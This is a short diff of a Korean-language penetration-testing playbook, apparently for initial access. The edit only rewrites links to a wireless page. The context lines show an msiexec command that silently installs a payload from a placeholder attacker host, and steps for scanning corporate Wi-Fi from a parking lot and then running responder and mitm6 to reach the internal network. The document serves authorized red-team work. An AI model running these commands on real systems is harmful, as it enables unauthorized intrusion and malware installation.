@@ -95,7 +95,7 @@ msiexec /q /i http://atk/payload.msi
 
 ## WiFi / 주차장 연계
 
-1. 주차장에서 guest / 회사 AP 스캔 → [Wireless](../wireless/index.md)
+1. 주차장에서 guest / 회사 AP 스캔 → [Wireless](wireless.md)
 2. 내부 AP 붙자마자 responder / mitm6
 3. 이 시점부터 Assumed Breach 와 사실상 동일한 "내부망 진입" 달성
 
@@ -137,6 +137,6 @@ PersistentKeepalive = 25
 
 ## 참고
 
-- [Wireless](../wireless/index.md)
+- [Wireless](wireless.md)
 - [Enumeration](../lifecycle/enumeration.md)
 - [C2 Infrastructure](../infra/c2.md)
